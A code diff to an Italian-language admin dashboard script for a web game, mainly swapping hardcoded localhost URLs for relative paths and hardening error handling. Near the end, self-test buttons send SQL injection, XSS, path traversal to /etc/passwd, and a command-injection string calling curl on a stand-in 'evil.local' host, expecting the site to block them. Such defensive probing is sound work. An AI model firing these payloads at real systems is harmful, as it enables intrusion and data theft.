@@ -224,7 +224,7 @@ async function loadSecurityMonthFull() {
   const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
   console.log("Token letto da JS:", csrfToken);
 
-  const res = await fetch('http://localhost:8000/admin/api/security_admin/security_logs_month_full.php?page=1', {
+  const res = await fetch('/admin/api/security_admin/security_logs_month_full.php?page=1', {
     method: 'GET',
     headers: {
         'X-CSRF-Token': csrfToken
@@ -233,12 +233,20 @@ async function loadSecurityMonthFull() {
   });
 
   if (!res.ok) {
-    const error = await res.json();
+    const error = await res.json().catch(() => ({}));
     console.error("Errore fetch security logs:", error);
+    toast("Security logs non disponibili", "error");
     return;
   }
 
-  const { logs, stats } = await res.json();
+  const payload = await res.json().catch(() => ({}));
+  const logs = Array.isArray(payload.logs) ? payload.logs : [];
+  const stats = (payload.stats && typeof payload.stats === "object") ? payload.stats : {};
+  if (!Array.isArray(payload.logs)) {
+    console.error("Payload security month non valido:", payload);
+    toast("Security logs non disponibili", "error");
+    return;
+  }
 
   // ---- LOG ----
   logs.forEach(log => {
@@ -382,13 +390,19 @@ window.banFromSecurityRow = async function({ userId, ip }) {
 // STATS
 // ===============================
 async function loadStats() {
-  const r = await safeFetch("http://localhost:8000/admin/api/admin_stats.php");
+  const r = await safeFetch("/admin/api/admin_stats.php");
   if (!r.ok) {  
     toast("Errore stats", "error");
     return;
   }
 
-  const { stats: s } = await r.json();
+  const payload = await r.json().catch(() => ({}));
+  const s = payload?.stats;
+  if (!s || typeof s !== "object") {
+    console.error("Payload stats non valido:", payload);
+    toast("Statistiche non disponibili", "error");
+    return;
+  }
   console.log(s); // Verifica cosa ricevi dal server
 
   window.stats = s; // Salviamo i dati globalmente
@@ -449,24 +463,44 @@ document.addEventListener("DOMContentLoaded", async () => {
   const startGameBtn = document.getElementById("btnStartGameAdmin");
   if (startGameBtn) {
     startGameBtn.addEventListener("click", () => {
-      window.location.href = "http://localhost:8000/user/user_dashboard.php";
+      window.location.href = "/user/user_dashboard.html";
+    });
+  }
+
+  const goIndexBtn = document.getElementById("btnGoIndexAdmin");
+  if (goIndexBtn) {
+    goIndexBtn.addEventListener("click", () => {
+      window.location.href = "/index/index.html";
     });
   }
 
   CURRENT_ADMIN = admin;
   el("#adminName").textContent = admin.username;
 
-  // ================= UPDATE LAST ACTIVITY =================
-  try {
-    const updateRes = await fetchWithCSRF("http://localhost:8000/api/update_activity.php", {
-      method: "POST"
-    });
-    if (updateRes.ok) {
-      console.log("✅ Last activity updated");
+  // ================= UPDATE LAST ACTIVITY (heartbeat) =================
+  async function updateLastActivity() {
+    try {
+      const updateRes = await fetchWithCSRF("/api/update_activity.php", {
+        method: "POST"
+      });
+      if (updateRes.ok) {
+        console.log("✅ Last activity updated");
+      }
+    } catch (e) {
+      console.error("Failed to update activity:", e);
     }
-  } catch (e) {
-    console.error("Failed to update activity:", e);
   }
+
+  // ping iniziale + heartbeat ogni 60s
+  await updateLastActivity();
+  const activityInterval = setInterval(() => {
+    // evita ping quando tab non visibile
+    if (document.visibilityState === "visible") {
+      updateLastActivity();
+    }
+  }, 60 * 1000);
+
+  window.addEventListener("beforeunload", () => clearInterval(activityInterval));
 
   // ================= SIDEBAR =================
   bindMenu();
@@ -490,11 +524,11 @@ document.addEventListener("DOMContentLoaded", async () => {
   }
 
   // Users
-  await loadUsers(fetchWithCSRF);
+  await loadUsers();
   // Stats
-  await loadStats(fetchWithCSRF);
+  await loadStats();
   // Security logs full
-  await loadSecurityMonthFull(fetchWithCSRF);
+  await loadSecurityMonthFull();
 
   // ================= NOTIFICATIONS =================
   const ESSENTIAL_SECURITY_EVENTS = new Set([
@@ -554,27 +588,37 @@ document.addEventListener("DOMContentLoaded", async () => {
 
   async function loadNotifications(limitEl) {
     const limit = parseInt(limitEl?.value) || 10;
-    const perPage = Math.max(limit * 10, 240);
+    const perPage = 500; // max consentito lato API
+    const maxPages = 20; // guardrail
     const tbody = document.getElementById("notifTable");
     if (tbody) tbody.innerHTML = `<tr><td colspan="3" style="opacity:.75">Caricamento...</td></tr>`;
 
     try {
-      const res = await fetchWithCSRF(`http://localhost:8000/admin/api/security_admin/list.php?page=1&per_page=${perPage}`);
-      if (res.ok) {
+      const allRows = [];
+      let page = 1;
+      let totalPages = 1;
+
+      do {
+        const res = await fetchWithCSRF(`/admin/api/security_admin/list.php?page=${page}&per_page=${perPage}`);
+        if (!res.ok) break;
         const data = await res.json().catch(() => ({}));
         const rows = Array.isArray(data.logs) ? data.logs : [];
-        const essentialRows = pickEssentialNotifications(rows, limit);
-        if (essentialRows.length > 0) {
-          renderNotifications(essentialRows);
-          return;
-        }
+        allRows.push(...rows);
+        totalPages = Math.max(1, Number(data.total_pages || 1));
+        page++;
+      } while (page <= totalPages && page <= maxPages);
+
+      if (allRows.length > 0) {
+        const essentialRows = pickEssentialNotifications(allRows, limit);
+        renderNotifications(essentialRows);
+        return;
       }
     } catch (e) {
       console.warn("list.php notifications fallback:", e);
     }
 
     try {
-      const fb = await fetchWithCSRF(`http://localhost:8000/admin/api/security_admin/security_logs_month_full.php?page=1`);
+      const fb = await fetchWithCSRF(`/admin/api/security_admin/security_logs_month_full.php?page=1`);
       if (!fb.ok) throw new Error(`fallback status ${fb.status}`);
       const data = await fb.json().catch(() => ({}));
       const rows = Array.isArray(data.logs) ? data.logs : [];
@@ -639,7 +683,7 @@ document.addEventListener("DOMContentLoaded", async () => {
   pruneOldSecurityLogs();
   syncSecurityUI();
   updateAlertBadge();
-  await loadAllSecurityLogs(fetchWithCSRF);
+  await loadAllSecurityLogs();
   renderSecurityPage(1);
   updateSecurityPagination();
 
@@ -659,7 +703,7 @@ document.addEventListener("DOMContentLoaded", async () => {
   }
 
   // ================= STATS =================
-  await loadStats(fetchWithCSRF);
+  await loadStats();
 
   // ================= AUTO-REFRESH PAGINA (ogni 5 minuti) =================
   setInterval(() => {
@@ -686,7 +730,7 @@ async function loadUsers(page = USERS_STATE.page) {
     show_deleted: USERS_STATE.showDeleted ? 1 : 0
   });
 
-  const r = await safeFetch(`http://localhost:8000/admin/api/admin_users.php?${params}`);
+  const r = await safeFetch(`/admin/api/admin_users.php?${params}`);
   if (!r.ok){
     toast("Errore utenti", "error");
     return;
@@ -745,7 +789,7 @@ function renderUsers(users) {
 window.restoreUser = async id => {
   if (!confirm("Ripristinare questo account?")) return;
 
-  await safeFetch("http://localhost:8000/admin/api/admin_user_action.php", {
+  await safeFetch("/admin/api/admin_user_action.php", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ action: "restore", id })
@@ -816,7 +860,7 @@ function insertBufferedLog(log, tbody = el("#securityAudit"), fromRender = false
 window.deleteUser = async id => {
   if (!confirm("Eliminare utente?")) return;
   try {
-    const r = await safeFetch("http://localhost:8000/admin/api/admin_user_action.php", {
+    const r = await safeFetch("/admin/api/admin_user_action.php", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ action: "delete", id })
@@ -833,7 +877,7 @@ window.deleteUser = async id => {
 };
 
 window.setRole = async (id, role) => {
-  await safeFetch("http://localhost:8000/admin/api/admin_user_action.php", {
+  await safeFetch("/admin/api/admin_user_action.php", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ action: "role", id, role })
@@ -938,7 +982,7 @@ window.banIp = function (ip) {
 
     if (!conferma) return;
 
-    fetch('http://localhost:8000/admin/api/admin_ban_ip.php', {
+    fetch('/admin/api/admin_ban_ip.php', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -969,7 +1013,7 @@ window.unbanUser = async id => {
 
   if (!confirm("Sbloccare questo utente?")) return;
 
-  const r = await safeFetch("http://localhost:8000/admin/api/admin_unban_user.php", {
+  const r = await safeFetch("/admin/api/admin_unban_user.php", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ id })
@@ -1169,7 +1213,7 @@ async function request2FA(){
     return;
   }
 
-  const r = await safeFetch("http://localhost:8000/admin/api/security_admin/request_2fa.php", {
+  const r = await safeFetch("/admin/api/security_admin/request_2fa.php", {
     method: "POST",
     headers: { "X-CSRF-Token": csrfToken }
   });
@@ -1182,7 +1226,7 @@ async function request2FA(){
   const code = prompt("Inserisci codice 2FA ricevuto via email");
   if(!code) return;
 
-  const confirm = await safeFetch("http://localhost:8000/admin/api/security_admin/confirm_clear_logs.php", {
+  const confirm = await safeFetch("/admin/api/security_admin/confirm_clear_logs.php", {
     method: "POST",
     headers:{ 
       "Content-Type":"application/json",
@@ -1534,7 +1578,7 @@ document.getElementById('simulateRCE')?.addEventListener('click', () => simulate
 document.getElementById('btnTestSqliAdmin')?.addEventListener('click', async () => {
   await runSecurityProbe({
     label: 'SQLi Admin API',
-    url: 'http://localhost:8000/admin/api/admin_users.php?q=SELECT%20*%20FROM%20users',
+    url: '/admin/api/admin_users.php?q=SELECT%20*%20FROM%20users',
     method: 'GET',
     expectedStatuses: [403]
   });
@@ -1543,7 +1587,7 @@ document.getElementById('btnTestSqliAdmin')?.addEventListener('click', async () 
 document.getElementById('btnTestSqliUser')?.addEventListener('click', async () => {
   await runSecurityProbe({
     label: 'SQLi User API',
-    url: 'http://localhost:8000/api/user/user_info.php?q=%27%20OR%201%3D1%20--',
+    url: '/api/user/user_info.php?q=%27%20OR%201%3D1%20--',
     method: 'GET',
     expectedStatuses: [403]
   });
@@ -1552,7 +1596,7 @@ document.getElementById('btnTestSqliUser')?.addEventListener('click', async () =
 document.getElementById('btnTestXssUser')?.addEventListener('click', async () => {
   await runSecurityProbe({
     label: 'XSS User API',
-    url: 'http://localhost:8000/api/user/user_info.php?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E',
+    url: '/api/user/user_info.php?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E',
     method: 'GET',
     expectedStatuses: [403]
   });
@@ -1561,7 +1605,7 @@ document.getElementById('btnTestXssUser')?.addEventListener('click', async () =>
 document.getElementById('btnTestLfiUser')?.addEventListener('click', async () => {
   await runSecurityProbe({
     label: 'LFI User API',
-    url: 'http://localhost:8000/api/user/user_info.php?q=..%2F..%2Fetc%2Fpasswd',
+    url: '/api/user/user_info.php?q=..%2F..%2Fetc%2Fpasswd',
     method: 'GET',
     expectedStatuses: [403]
   });
@@ -1570,7 +1614,7 @@ document.getElementById('btnTestLfiUser')?.addEventListener('click', async () =>
 document.getElementById('btnTestRceUser')?.addEventListener('click', async () => {
   await runSecurityProbe({
     label: 'RCE User API',
-    url: 'http://localhost:8000/api/user/user_info.php?q=%24%28curl%20http%3A%2F%2Fevil.local%29',
+    url: '/api/user/user_info.php?q=%24%28curl%20http%3A%2F%2Fevil.local%29',
     method: 'GET',
     expectedStatuses: [403]
   });
@@ -1579,7 +1623,7 @@ document.getElementById('btnTestRceUser')?.addEventListener('click', async () =>
 document.getElementById('btnTestAntiCheat')?.addEventListener('click', async () => {
   await runSecurityProbe({
     label: 'Anti-Cheat invalid run token',
-    url: 'http://localhost:8000/api/user/gain_xp.php',
+    url: '/api/user/gain_xp.php',
     method: 'POST',
     body: { action: 'l0_level_complete', stage: 0, run_token: 'tamper-test-token' },
     expectedStatuses: [403, 409]
@@ -1793,7 +1837,7 @@ function updateSecurityPagination() {
 async function loadAllSecurityLogs() {
     try {
         const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
-        const res = await fetch('http://localhost:8000/admin/api/security_admin/security_logs_month_full.php', {
+        const res = await fetch('/admin/api/security_admin/security_logs_month_full.php', {
             method: 'GET',
             credentials: 'include',
             headers: {
@@ -1802,19 +1846,29 @@ async function loadAllSecurityLogs() {
             }
         });
 
-        const data = await res.json();
-        console.log("Totale log ricevuti:   ", data.logs.length);
+        if (!res.ok) {
+            const failText = await res.text().catch(() => "");
+            console.error("Errore HTTP security logs:", res.status, failText.slice(0, 200));
+            toast("Errore caricamento security logs", "error");
+            return;
+        }
+
+        const data = await res.json().catch(() => ({}));
+        const logs = Array.isArray(data.logs) ? data.logs : [];
+        console.log("Totale log ricevuti:", logs.length);
 
         if (Array.isArray(data.logs)) {
             // Ordina decrescente per created_at
-            allSecurityLogs = data.logs.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+            allSecurityLogs = logs.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
             currentSecurityPage = 1;
             renderSecurityPage();
         } else {
-            console.error("Errore fetch security logs:", data.error);
+            console.error("Payload security logs non valido:", data);
+            toast("Security logs non disponibili", "error");
         }
     } catch (e) {
         console.error("Errore fetch security logs:", e);
+        toast("Errore rete security logs", "error");
     }
 }
 
